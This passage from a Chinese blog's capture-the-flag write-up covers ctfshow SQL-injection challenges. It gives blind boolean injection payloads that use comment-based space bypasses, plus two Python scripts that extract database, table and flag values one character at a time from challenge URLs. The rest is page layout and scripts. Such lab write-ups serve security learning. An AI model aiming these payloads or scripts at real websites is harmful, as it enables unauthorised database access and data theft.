+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1/**/or/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),1,1))=102</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.爆字段（flag）</strong><br><code>id=-1/**/or/**/ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;/**/limit/**/0,1),1,1))=102</code></p>
+<p><strong>4.爆字段值</strong><br><code>id=-1/**/or/**/ascii(substr((select/**/flag/**/from/**/flag/**/limit/**/0,1),1,1))=102</code></p>
+<p>下面两个python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&#x27;http://cd13a268-7832-48b3-91ba-9bbc519bf77d.chall.ctf.show/index.php&#x27;</span></span><br><span class="line">table=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="comment">#爆表名  flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#爆字段名 flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#读取flag</span></span><br><span class="line">        payload = <span class="string">&quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;</span>%(<span class="built_in">str</span>(i), <span class="built_in">str</span>(j))</span><br><span class="line"></span><br><span class="line">        ra = s.get(url=url + <span class="string">&#x27;?id=0/**/or/**/&#x27;</span> + payload).text</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;I asked nothing&#x27;</span> <span class="keyword">in</span> ra:</span><br><span class="line">            table += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(table)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url = <span class="string">&quot;http://cd13a268-7832-48b3-91ba-9bbc519bf77d.chall.ctf.show/index.php?id=-1&#x27;/**/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>(<span class="params">url</span>):</span>  <span class="comment"># 爆库名</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">            u = <span class="string">&quot;or/**/ascii(substr(database()/**/from/**/&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;/**/for/**/1))=&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;#&quot;</span></span><br><span class="line">            s = url + u</span><br><span class="line">            <span class="built_in">print</span>(s)</span><br><span class="line">            r = requests.get(s)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;By Rudyard Kipling&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(j))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table</span>(<span class="params">url</span>):</span>  <span class="comment"># 爆表名</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">128</span>):</span><br><span class="line">                u = <span class="built_in">id</span> = <span class="string">&quot;||/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1/**/offset/**/&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    i) + <span class="string">&quot;)/**/from/**/&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;/**/for/**/1))=&quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;#&quot;</span></span><br><span class="line">                s = url + u</span><br><span class="line">                <span class="built_in">print</span>(s)</span><br><span class="line">                r = requests.get(s)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;By Rudyard Kipling&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    table_name += <span class="built_in">chr</span>(k)</span><br><span class="line">            <span class="built_in">print</span>(table_name)</span><br><span class="line"></span><br><span class="line">db(url);</span><br><span class="line">table(url);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://wh1tecell.top/2021/01/01/[ctfshow%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5%E9%83%A8%E5%88%86]/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2021/01/03/%E5%AE%89%E8%A3%85hexo%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            利用hexo+github搭建blog小结
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/12/23/MSF%E4%B9%8B%E5%88%A9%E7%94%A8MS17_010%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">MSF利用MS17_010渗透内网主机</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021
+        <i class="ri-heart-fill heart_icon"></i> Wh1tecell
+      </li>
+    </ul>
+    <ul>
+      <li>
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+        <li>
+          <a href="" target="_black" rel="nofollow">闽ICP备2021001239号</a>
+        </li>
+        
+    </ul>
+    <!-- 运行天数 -->
+	<ul>
+		<li><span id="runtime_span"></span></li>
+		<script type="text/javascript">			
+    function show_runtime() {
+        window.setTimeout("show_runtime()", 1000);
+        X = new Date("01/01/2021 12:00:00");
+        Y = new Date();
+        T = (Y.getTime() - X.getTime());
+        M = 24 * 60 * 60 * 1000;
+        a = T / M;
+        A = Math.floor(a);
+        b = (a - A) * 24;
+        B = Math.floor(b);
+        c = (b - B) * 60;
+        C = Math.floor((b - B) * 60);
+        D = Math.floor((c - C) * 60);
+        runtime_span.innerHTML = "小站在各种崩坏中坚持了:" + A + "天" + B + "小时" + C + "分" + D + "秒"
+    }
+	show_runtime();
+</script>
+
+	</ul>
+
+
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+
+
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/touxiang.png" alt="Wh1tecell&#39;blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+
+<script src="/js/clickLove.js"></script>
+
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+  </div>
+</body>
+<!-- 三角彩带背景 -->
+  <canvas id="evanyou-canvas" style="opacity: 0.3; position: fixed; top: 0px; left: 0px; z-index: -1; width: 100%; height: 100%; pointer-events: none;"></canvas>
+  <script src="https://cdn.jsdelivr.net/gh/XXXZhy/Blog_Image/js/evanyou_canvas.js"></script>
+</html>
